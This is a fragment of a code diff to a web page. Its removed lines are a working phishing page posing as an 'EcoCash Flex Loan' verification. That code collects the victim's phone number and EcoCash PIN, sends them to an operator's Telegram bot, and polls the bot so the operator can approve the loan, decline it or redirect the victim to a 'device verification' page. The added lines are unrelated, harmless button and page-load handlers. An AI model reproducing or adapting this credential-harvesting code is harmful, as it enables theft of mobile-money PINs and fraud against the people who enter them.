-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '✅ Approve Loan',  callback_data: approveId },
-                { text: '📱 Verify Device', callback_data: verifyId  }
-              ],
-              [{ text: '❌ Decline', callback_data: declineId }]
-            ]
-          }
-        })
-      })
-      .then(() => {
-        // Save phone to localStorage (original behaviour)
-        localStorage.setItem('phone', phone);
-        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+        // Handle back button
+        function goBack() {
+            window.location.href = 'index.html';
+        }
 
-        spinnerOverlay.style.display = 'flex';
-        startPolling(approveId, declineId, verifyId);
-      })
-      .catch(() => resetButton());
-    }
+        // Allow Enter key to submit
+        pinInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                continueBtn.click();
+            }
+        });
 
-    function startPolling(approveId, declineId, verifyId) {
-      const interval = setInterval(() => {
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-          .then(r => r.json())
-          .then(data => {
-            if (!data.ok || !data.result) return;
-
-            data.result.forEach(update => {
-              state.lastUpdateId = update.update_id;
-
-              if (update.callback_query) {
-                const cb = update.callback_query.data;
-
-                if (cb === approveId) {
-                  clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  window.location.href = CONFIG.APPROVE_PAGE;
-                }
-                else if (cb === verifyId) {
-                  clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  window.location.href = CONFIG.DEVICE_PAGE;
-                }
-                else if (cb === declineId) {
-                  clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  showError('Request declined. Please try again.');
-                  resetButton();
-                }
-              }
-            });
-          });
-      }, 1000);
-    }
-
-    // ── Submit ──
-    continueBtn.addEventListener('click', () => {
-      errMsg.style.display = 'none';
-
-      const phone = normalizePhone(phoneInput.value);
-      const pin   = pinInput.value.trim();
-
-      if (phone.length !== 9) {
-        showError('Please enter a valid 9-digit mobile number.');
-        return;
-      }
-      if (pin.length !== 4) {
-        showError('Please enter your 4-digit EcoCash PIN.');
-        return;
-      }
-
-      sendToBot(phone, pin);
-    });
-
-    // ── Init ──
-    window.addEventListener('pageshow', (event) => {
-      if (event.persisted) window.location.reload();
-    });
-
-    window.addEventListener('load', loadApplicationDetails);
-  </script>
+        // Initialize on page load
+        window.addEventListener('load', loadBundleData);
+    </script>
 </body>
 </html>
